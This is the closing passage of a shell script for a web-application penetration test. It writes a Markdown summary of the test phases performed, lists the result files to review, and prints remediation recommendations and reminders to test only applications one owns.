cat > "$OUTPUT_DIR/PENTEST_SUMMARY.md" << EOF
# Portfolio Application Penetration Test Summary

**Target:** $TARGET_URL
**Test Date:** $(date)
**Test Duration:** Started at $TIMESTAMP
**Output Directory:** $OUTPUT_DIR

## Tests Performed

### Phase 1: Reconnaissance
- ✅ Technology stack identification
- ✅ HTTP headers analysis
- ✅ Robots.txt and sitemap check

### Phase 2: Discovery
- ✅ Directory bruteforcing
- ✅ API endpoint discovery
- ✅ Admin endpoint enumeration

### Phase 3: Authentication Testing
- ✅ User-Agent bypass testing
- ✅ HTTP method override testing
- ✅ IP spoofing attempts
- ✅ Referrer bypass testing

### Phase 4: Injection Testing
- ✅ SQL injection testing (20+ payloads)
- ✅ NoSQL injection testing (15+ payloads)
- ✅ XSS vulnerability testing (20+ payloads)

### Phase 5: Admin Function Testing
- ✅ Direct access testing
- ✅ Authorization bypass attempts
- ✅ Admin API manipulation
- ✅ Function injection testing

### Phase 6: File Upload Testing
- ✅ Malicious file upload attempts
- ✅ Extension bypass testing
- ✅ MIME type manipulation

### Phase 7: Security Configuration
- ✅ Security headers analysis
- ✅ SSL/TLS configuration testing
- ✅ CORS policy testing

### Phase 8: Business Logic
- ✅ Race condition testing
- ✅ Rate limiting verification
- ✅ Input validation bypass

### Phase 9: Information Disclosure
- ✅ Sensitive file exposure check
- ✅ Configuration file testing
- ✅ Backup file discovery

## Key Files to Review

1. **Critical Findings:**
   - \`auth_bypass_results.txt\` - Authentication bypass attempts
   - \`sql_injection_test.py\` results - SQL injection testing
   - \`admin_function_test.py\` results - Admin access testing

2. **Vulnerability Analysis:**
   - \`xss_test.py\` results - Cross-site scripting
   - \`nosql_injection_test.py\` results - NoSQL injection
   - \`file_upload_results.txt\` - File upload security

3. **Configuration Issues:**
   - \`security_headers_*.txt\` - Missing security headers
   - \`ssl_test_*.txt\` - SSL/TLS configuration
   - \`info_disclosure.txt\` - Information leakage

## Recommendations

Based on the testing performed, review the following:

1. **Authentication Security:**
   - Implement proper rate limiting
   - Add multi-factor authentication
   - Strengthen session management

2. **Input Validation:**
   - Implement server-side validation
   - Add output encoding
   - Use parameterized queries

3. **Security Headers:**
   - Add Content Security Policy
   - Implement X-Frame-Options
   - Enable HSTS headers

4. **Access Controls:**
   - Verify admin panel protection
   - Implement proper authorization
   - Add audit logging

## Next Steps

1. Review all test results in detail
2. Prioritize critical findings
3. Implement security fixes
4. Perform regression testing
5. Schedule regular security assessments

---
**End of Penetration Test Summary**
EOF

echo -e "${GREEN}✅ COMPREHENSIVE PENETRATION TEST COMPLETED!${NC}"
echo -e "${BLUE}📊 Results Summary:${NC}"
echo -e "${CYAN}  - Output Directory: $OUTPUT_DIR${NC}"
echo -e "${CYAN}  - Test Files Generated: $(find $OUTPUT_DIR -type f | wc -l)${NC}"
echo -e "${CYAN}  - Summary Report: $OUTPUT_DIR/PENTEST_SUMMARY.md${NC}"

echo -e "\n${YELLOW}📋 Key Files to Review:${NC}"
echo -e "${PURPLE}  🔍 Discovery: dirb_scan_*.txt, api_discovery.txt, admin_discovery.txt${NC}"
echo -e "${PURPLE}  🔓 Auth Bypass: auth_bypass_results.txt${NC}"
echo -e "${PURPLE}  💉 Injection: sql_injection_test.py, nosql_injection_test.py, xss_test.py${NC}"
echo -e "${PURPLE}  🔐 Admin Testing: admin_function_test.py, file_upload_results.txt${NC}"
echo -e "${PURPLE}  ⚙️  Configuration: security_headers_*.txt, ssl_test_*.txt${NC}"
echo -e "${PURPLE}  📊 Summary: PENTEST_SUMMARY.md${NC}"

echo -e "\n${RED}⚠️  IMPORTANT REMINDERS:${NC}"
echo -e "${RED}  - Only test applications you own${NC}"
echo -e "${RED}  - Document all findings responsibly${NC}"
echo -e "${RED}  - Follow responsible disclosure practices${NC}"
echo -e "${RED}  - Re-enable any security features you may have disabled${NC}"

echo -e "\n${GREEN}🎯 Happy Penetration Testing!${NC}"